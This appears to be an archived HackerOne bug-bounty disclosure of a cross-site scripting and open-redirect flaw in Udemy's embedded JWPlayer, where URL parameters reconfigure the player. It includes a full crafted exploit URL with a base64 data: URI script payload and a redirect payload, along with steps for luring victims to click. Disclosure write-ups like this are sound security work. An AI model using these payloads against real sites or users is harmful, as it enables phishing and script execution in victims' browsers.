@@ -1,0 +1,32 @@
+ReportLink:https://hackerone.com/reports/95640
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/decay
+ReportedTo:Udemy(udemy)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:24.02.2016 19:34:10
+
+Summary:
+
+**1)** Malicious attacker by visiting course page (e.g. https://www.udemy.com/overview-of-big-data-hadoop/) and intercepting browser's generated requests can find one to the following URL:
+
+    https://www.udemy.com/embed/video/E0IfdVtaQngT/?params%5Bvars%5D%5Bplaylist%5D%5B0%5D%5Bimage%5D=https%3A%2F%2Fdujk9xa5fr1wz.cloudfront.net%2Fcourse%2F750x422%2F211248_71a0_4.jpg&params%5BtrackVideoPlay%5D=true&xdm_e=https%3A%2F%2Fwww.udemy.com%2Foverview-of-big-data-hadoop%2F&xdm_c=default1987&xdm_p=4
+
+It is made for loading JWplayer to show demo video from course overview page. URL parameters of that request are interpreted by web server as parameters of JWplayer's "setup" function. 
+
+Picture **0.jpg** shows like "**params%5Bvars%5D%5Bplaylist%5D%5B0%5D%5Bimage%5D=https%3A%2F%2Fdujk9xa5fr1wz.cloudfront.net%2Fcourse%2F750x422%2F211248_71a0_4.jpg**" is posted into **script** block and interpreted as background image of the player.
+
+**2)** Attacker can use that server's behavior in order to reconfigure JWPlayer according to the following [Manual](http://support.jwplayer.com/customer/portal/articles/1413113-configuration-options-reference)
+
+For example, he can add "logo" block to the player via attributes "logo.file", "logo.link" and change the player's window size. **This will add clickable logo which will cover player's window. "logo.link" can contain one of the following payloads:**
+- //google.com.ua           <-- this can be used for users **redirection**
+- data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=    <--  this can be used for **execution of any JavaScript code (XSS) in context of about:blank.**
+
+As a result, malicious URL will be look like this: 
+
+     https://www.udemy.com/embed/video/E0IfdVtaQngT/?params[vars][abouttext]=Play&params[vars][controls]=false&params[vars][width]=750&params[vars][height]=422&params[vars][logo][file]=https%3A%2F%2Fdujk9xa5fr1wz.cloudfront.net%2Fcourse%2F750x422%2F211248_71a0_4.jpg&params[vars][logo][link]=data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=&params[trackVideoPlay]=true&xdm_e=https%3A%2F%2Fwww.udemy.com%2Foverview-of-big-data-hadoop%2F&xdm_c=default2455&xdm_p=4
+ 
+**3) Attacker can send created URL to the victim user. After clicking on it, user will be navigated to the page which will look like valid video (example represented on screen 1.jpg). After clicking on the image malicious redirection or JavaScript execution will happen (result of execution represented on screen 2.jpg).**
+
+Image which is used as "logo.file" could contain "Play" button or anything else to attract attention and seduce users to click it. XSS code can be modified in various ways too. **This approach is working great on Firefox and Opera browsers**.  
